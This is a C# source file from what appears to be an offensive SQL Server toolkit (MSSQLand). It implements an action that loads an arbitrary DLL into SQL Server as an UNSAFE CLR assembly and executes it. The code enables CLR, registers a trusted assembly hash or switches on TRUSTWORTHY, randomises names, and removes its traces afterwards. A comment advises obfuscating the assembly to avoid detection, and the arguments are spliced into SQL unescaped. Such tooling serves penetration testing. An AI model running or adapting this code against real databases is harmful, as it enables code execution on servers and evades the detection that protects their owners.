// MSSQLand/Actions/Execution/ClrExecution.cs

using System;
using System.Text.RegularExpressions;

using MSSQLand.Services;
using MSSQLand.Utilities;

namespace MSSQLand.Actions.Execution
{
    /// <summary>
    /// Executes a CLR (Common Language Runtime) assembly within the SQL Server context.
    /// WARNING: The assembly used is written on disk at some point by sqlserver.exe, which may trigger detections. Use with caution and ensure the assembly is clean and obfuscated if necessary.
    /// Assemblies should contain functions callable from SQL Server, typically with a signature like:
    /// <code>
    /// public static void Exec(string args)
    /// </code>
    /// The SQL types available for parameters are limited, so complex data should be passed as a single string argument and parsed within the assembly.
    /// https://learn.microsoft.com/en-us/sql/relational-databases/clr-integration-database-objects-types-net-framework/mapping-clr-parameter-data?view=sql-server-ver17&tabs=csharp
    /// </summary>
    internal class ClrExecution : BaseAction
    {
        [ArgumentMetadata(Position = 0, Required = true, Description = "Path to the DLL")]
        private string _dllPath = string.Empty;

        [ArgumentMetadata(Position = 1, Required = true, Description = "Class name containing the function to execute")]
        private string _className = string.Empty;

        [ArgumentMetadata(Position = 2, Required = true, Description = "Function name to execute")]
        private string _function = string.Empty;

        [ArgumentMetadata(Position = 3, Remainder = true, Description = "Function args")]
        private string _args = string.Empty;

        public override object Execute(DatabaseContext databaseContext)
        {
            Logger.Task($"Deploying CLR assembly from: {_dllPath}");

            // Step 1: Get the SHA-512 hash for the DLL and its bytes.
            string[] library = ByteHelper.ConvertDllToSqlBytes(_dllPath);

            if (library.Length != 2 || string.IsNullOrEmpty(library[0]) || string.IsNullOrEmpty(library[1]))
            {
                Logger.Error("Failed to convert DLL to SQL-compatible bytes.");
                return false;
            }

            if (!databaseContext.ConfigService.SetConfigurationOption("clr enabled", 1))
            {
                return false;
            }

            string libraryHash = library[0];
            string libraryHexBytes = library[1];

            Logger.Info($"SHA-512 Hash: {libraryHash}");
            Logger.Info($"DLL Bytes Length: {libraryHexBytes.Length}");

            string assemblyName = ByteHelper.GetRandomIdentifier(6);

            string dropProcedure = $"DROP PROCEDURE IF EXISTS [{_function}]";
            string dropAssembly = $"DROP ASSEMBLY IF EXISTS [{assemblyName}]";
            string dropClrHash = $"EXEC sp_drop_trusted_assembly 0x{libraryHash}";
            bool usedTrustedAssembly = false;
            bool setTrustworthy = false;

            Logger.TaskNested("Starting deployment process");

            try
            {
                // Strategy 1: Try sp_add_trusted_assembly (requires VIEW SERVER SECURITY STATE)
                // Strategy 2: Fall back to TRUSTWORTHY property (requires db_owner on a trustworthy-eligible database)
                if (!databaseContext.QueryService.ExecutionServer.IsLegacy)
                {
                    usedTrustedAssembly = databaseContext.ConfigService.PrepareForTrustedAssembly(libraryHash);
                }

                if (!usedTrustedAssembly)
                {
                    Logger.Warning("Trusted assembly registration unavailable, falling back to TRUSTWORTHY");
                    object trustworthyResult = databaseContext.QueryService.ExecuteScalar(
                        $"SELECT is_trustworthy_on FROM sys.databases WHERE name = DB_NAME()");

                    bool isTrustworthy = trustworthyResult != null && Convert.ToBoolean(trustworthyResult);

                    if (!isTrustworthy)
                    {
                        Logger.Warning("Current database is not TRUSTWORTHY");
                        Logger.WarningNested("Attempting to enable it");
                        try
                        {
                            databaseContext.QueryService.ExecuteNonProcessing(
                                $"ALTER DATABASE [{databaseContext.QueryService.ExecutionServer.Database}] SET TRUSTWORTHY ON;");
                            setTrustworthy = true;
                            Logger.Success("TRUSTWORTHY enabled on current database");
                        }
                        catch (Exception ex)
                        {
                            Logger.Error($"Failed to enable TRUSTWORTHY: {ex.Message}");
                            return false;
                        }
                    }
                    else
                    {
                        Logger.Info("Database is already TRUSTWORTHY, using it for CLR deployment");
                    }
                }

                // Build and execute a single batch: sp_add_trusted_assembly (if needed) +
                // drop/create assembly + create procedure. Running these together in one
                // ExecuteNonProcessing call ensures they land in the same remote connection,
                // which avoids the distributed-transaction visibility issue where CREATE ASSEMBLY
                // would not see the trusted assembly entry added in a prior call.
                Logger.TaskNested("Deploying assembly and stored procedure");

                string assemblyDescription = $"{ByteHelper.GetRandomIdentifier(6)}, version=0.0.0.0, culture=neutral, publickeytoken=null, processorarchitecture=msil";
                string addTrustedQuery = usedTrustedAssembly
                    ? ConfigurationService.GetTrustedAssemblyQuery(libraryHash, assemblyDescription) + "\n"
                    : string.Empty;

                try
                {
                    // sp_add_trusted_assembly and CREATE ASSEMBLY stay together (same call) to
                    // land in the same remote connection and avoid DTC visibility issues.
                    databaseContext.QueryService.ExecuteNonProcessing($@"
                        {addTrustedQuery}
                        DROP PROCEDURE IF EXISTS [{_function}];
                        DROP ASSEMBLY IF EXISTS [{assemblyName}];
                        CREATE ASSEMBLY [{assemblyName}] FROM 0x{libraryHexBytes} WITH PERMISSION_SET = UNSAFE");
                    databaseContext.QueryService.ExecuteNonProcessing(
                        $"CREATE PROCEDURE [dbo].[{_function}] @args NVARCHAR(MAX) AS EXTERNAL NAME [{assemblyName}].[{_className}].[{_function}]");
                }
                catch (Exception createErr)
                {
                    string conflicting = ExtractMvidConflictName(createErr.Message);
                    if (!string.IsNullOrEmpty(conflicting))
                    {
                        Logger.Warning($"Dropping conflicting leftover assembly '{conflicting}' (MVID collision)");
                        databaseContext.QueryService.ExecuteNonProcessing($"DROP ASSEMBLY IF EXISTS [{conflicting}]");
                        databaseContext.QueryService.ExecuteNonProcessing($@"
                            {addTrustedQuery}
                            DROP ASSEMBLY IF EXISTS [{assemblyName}];
                            CREATE ASSEMBLY [{assemblyName}] FROM 0x{libraryHexBytes} WITH PERMISSION_SET = UNSAFE");
                        databaseContext.QueryService.ExecuteNonProcessing(
                            $"CREATE PROCEDURE [dbo].[{_function}] @args NVARCHAR(MAX) AS EXTERNAL NAME [{assemblyName}].[{_className}].[{_function}]");
                    }
                    else
                    {
                        throw;
                    }
                }

                Logger.Success($"Assembly '{assemblyName}' and procedure '{_function}' deployed");

                // Step 5: Execute the stored procedure
                Logger.TaskNested($"Executing the stored procedure '{_function}'");
                databaseContext.QueryService.ExecuteNonProcessing($"EXEC [{_function}] @args = '{_args}'");
                Logger.Success("Stored procedure executed successfully");

                return true;
            }
            catch (Exception ex)
            {
                Logger.Error($"Error during CLR assembly deployment: {ex.Message}");
                return false;
            }
            finally
            {
                // Cleanup (always executed)
                Logger.TaskNested("Performing cleanup");
                databaseContext.QueryService.ExecuteNonProcessing(dropProcedure);
                databaseContext.QueryService.ExecuteNonProcessing(dropAssembly);

                if (usedTrustedAssembly)
                {
                    databaseContext.QueryService.ExecuteNonProcessing(dropClrHash);
                }

                if (setTrustworthy)
                {
                    Logger.TaskNested("Resetting TRUSTWORTHY property");
                    databaseContext.QueryService.ExecuteNonProcessing(
                        $"ALTER DATABASE [{databaseContext.QueryService.ExecutionServer.Database}] SET TRUSTWORTHY OFF;");
                }
            }
        }

        /// <summary>
        /// Extract the conflicting assembly name from an MVID collision error.
        /// SQL Server message: "CREATE ASSEMBLY failed ... identical to an assembly
        /// that is already registered under the name 'X'."
        /// </summary>
        private static string ExtractMvidConflictName(string errorMessage)
        {
            Match match = Regex.Match(
                errorMessage,
                @"already registered under the name ['""']([^'""']+)['""']",
                RegexOptions.IgnoreCase);
            return match.Success ? match.Groups[1].Value : string.Empty;
        }
    }
}
